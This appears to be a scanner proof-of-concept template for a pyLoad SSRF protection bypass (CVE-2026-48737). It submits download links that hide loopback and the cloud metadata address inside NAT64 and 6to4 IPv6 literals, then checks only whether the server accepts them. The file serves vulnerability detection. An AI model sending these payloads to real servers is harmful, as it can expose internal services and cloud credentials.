[info]
id = "POC-AVE-2026-0045"
name = "pyLoad SSRF防护绕过PoC - IPv6 NAT64/6to4过渡封装检测"
author = "AVE"
severity = "medium"
tags = ["ssrf", "cve-2026-48737", "pyload", "ipv6", "nat64", "6to4"]
description = "pyLoad(pyload-ng)的SSRF防护机制is_global_address/is_global_host未正确处理IPv6过渡编码地址(NAT64 64:ff9b::/96、6to4 2002::/16)中嵌入的内网IPv4地址。Python IPv6Address.is_global对NAT64前缀返回True，攻击者可构造包含此类IPv6字面量的下载URL绕过防护。该PoC向pyLoad API提交包含NAT64/6to4编码内网地址的下载任务，验证服务器是否接受URL（即SSRF防护被绕过）。"
vuln_id = ["CVE-2026-48737", "AVE-2026-0045"]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/api/add_package"

headers.Content-Type = "application/json"
headers.Accept = "application/json"

body.type = "json"
body.name = "POC_SSRF_NAT64_CHECK"
body.links = ["http://[64:ff9b::7f00:1]/poc_ave_check"]
body.dest = 1

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["\"id\""]
expect = true

[[poc.requests]]
method = "POST"
path = "/api/add_package"

headers.Content-Type = "application/json"
headers.Accept = "application/json"

body.type = "json"
body.name = "POC_SSRF_6TO4_CHECK"
body.links = ["http://[2002:a9fe:a9fe::]/poc_ave_check"]
body.dest = 1

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["\"id\""]
expect = true
